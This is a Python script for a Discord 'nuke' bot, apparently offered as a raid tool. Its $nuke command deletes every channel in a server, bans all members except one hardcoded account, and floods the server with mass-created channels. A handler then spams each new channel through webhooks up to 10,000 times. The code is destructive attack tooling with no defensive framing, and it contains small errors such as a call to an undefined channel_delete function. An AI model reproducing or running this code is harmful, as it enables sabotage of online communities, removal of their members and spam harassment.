import sys, discord, requests, json, threading, random, asyncio,aiohttp, time
import os
from discord.ext import commands
import colorama
from colorama import Fore, Style, Back
from time import sleep
from datetime import datetime

now = datetime.now()
ftime = now.strftime("%H:%M:%S")

session = requests.Session()

token = ("")
prefix = ("$")
stats = ("Among Us")
chan = ("😈")
spamdata = ("")
webname = ("😈SilentSlave😈")
amountss = 10000
intents = discord.Intents().all()
intents.message_content = True
bot = commands.Bot(command_prefix=prefix, intents=intents)
bot.remove_command("help")

if bot:
  headers = {
    "Authorization": 
      f"Bot {token}"
  }
else:
  headers = {
    "Authorization": 
      token
  }
  

@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Game(stats))
    print("""
╱╱╱╭━╮╭━┳━━━┳━━┳╮╱╱╭━━━┳━╮╱╭┳━━━━┳━╮╭━╮
╱╱╱╰╮╰╯╭┫╭━╮┣┫┣┫┃╱╱┃╭━━┫┃╰╮┃┃╭╮╭╮┣╮╰╯╭╯
╭╮╭╮╰╮╭╯┃╰━━╮┃┃┃┃╱╱┃╰━━┫╭╮╰╯┣╯┃┃╰╯╰╮╭╯╭╮╭╮
╰╋╋╯╭╯╰╮╰━━╮┃┃┃┃┃╱╭┫╭━━┫┃╰╮┃┃╱┃┃╱╱╭╯╰╮╰╋╋╯
╭╋╋┳╯╭╮╰┫╰━╯┣┫┣┫╰━╯┃╰━━┫┃╱┃┃┃╱┃┃╱╭╯╭╮╰┳╋╋╮
╰╯╰┻━╯╰━┻━━━┻━━┻━━━┻━━━┻╯╱╰━╯╱╰╯╱╰━╯╰━┻╯╰╯""")
    print("Commands - nuke")
    print(f"Logged in as {bot.user.name}")
    print(f"Prefix - {prefix}")

def logo():
    print(f"Logged in as {bot.user.name}")
    print(f"Prefix - {prefix}")

@bot.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild.id
    for channel in list(ctx.guild.channels):
        await channel.delete()
    def cc(i):
        json = {
          "name": i
        }
        session.post(
          f"https://discord.com/api/v9/guilds/{guild}/channels",
          headers=headers,
          json=json
        )
    for member in ctx.guild.members:
      if member.id != 875269061649530901:  
        try:
          await member.ban(reason= "😈Silent😈")
          print(f"\x1b[38;5;34m{member.name} Has Been Successfully Banned In {ctx.guild.name}")
        except:
          print(f"\x1b[38;5;196mUnable To Ban {member.name} In {ctx.guild.name}!")
    for i in range(250):
           for channel in list(ctx.guild.channels):   
               threading.Thread(
                    target=channel_delete,
                    args=(channel.id, )
               ).start()
    for i in range(250):
           threading.Thread(
             target=cc,
             args=(chan, )
           ).start()
           
@bot.event
async def on_guild_channel_create(channel):
        try:
            webhook = await channel.create_webhook(name=webname)
            for i in range(10000):   
                 await webhook.send(spamdata)
        except:
            print("Ratelimited")


bot.run(token)
